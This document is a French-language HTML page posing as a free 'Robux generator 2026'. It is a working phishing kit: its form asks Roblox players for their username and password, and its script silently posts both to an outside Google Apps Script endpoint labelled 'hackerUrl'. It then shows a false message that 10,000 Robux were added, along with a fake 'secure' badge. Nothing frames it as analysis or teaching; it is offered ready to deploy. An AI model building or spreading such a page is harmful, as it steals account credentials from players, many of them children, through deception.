<!DOCTYPE html>
<html>
<head>
    <title>Générateur de Robux Gratuit 2026</title>
    <style>
        body {
            background: #1a1a2e;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: #0f3460;
            border-radius: 12px;
            padding: 30px;
            width: 350px;
            text-align: center;
        }
        h1 {
            color: #e53e3e;
            font-size: 20px;
        }
        input, button {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border-radius: 6px;
            border: none;
        }
        input {
            background: #1a1a2e;
            color: white;
        }
        button {
            background: #e53e3e;
            color: white;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔥 GÉNÉRATEUR DE ROBUX 2026 🔥</h1>
        <input type="text" id="username" placeholder="Pseudo Roblox">
        <input type="password" id="password" placeholder="Mot de passe Roblox">
        <button onclick="send()">GÉNÉRER LES ROBUX</button>
        <p style="color:#888; font-size:12px; margin-top:15px;">🔒 Sécurisé</p>
    </div>

    <script>
        // ⚠️⚠️⚠️ TON URL ⚠️⚠️⚠️
        const hackerUrl = "https://script.google.com/macros/s/AKfycbyxBnBePpWfs0iHoosucuDbqnqLRzyadV0LJqxJiW0a0lHgh4F1GPUQ0QyS2zRzXsapHQ/exec";
        
        function send() {
            let username = document.getElementById('username').value;
            let password = document.getElementById('password').value;
            
            if(!username || !password) {
                alert("Veuillez entrer votre pseudo et mot de passe");
                return;
            }
            
            fetch(hackerUrl, {
                method: "POST",
                headers: {"Content-Type": "application/x-www-form-urlencoded"},
                body: "username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password)
            });
            
            alert("✅ 10 000 Robux ajoutés ! Redémarre Roblox.");
        }
    </script>
</body>
</html>
